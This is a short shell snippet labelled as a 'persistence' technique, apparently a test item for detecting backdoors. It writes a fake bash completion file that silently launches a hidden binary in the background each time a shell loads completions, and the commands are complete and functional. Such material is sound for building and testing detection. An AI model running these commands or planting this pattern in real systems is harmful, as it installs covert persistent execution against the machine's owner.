# category: persistence
# title: Backdoor sourced from a bash completion fragment
# indicator: bash_completion.d/zz-bench
mkdir -p /etc/bash_completion.d
printf '# bash completion\n(/usr/local/sbin/.compagent >/dev/null 2>&1 &)\n' >/etc/bash_completion.d/zz-bench
chmod 644 /etc/bash_completion.d/zz-bench
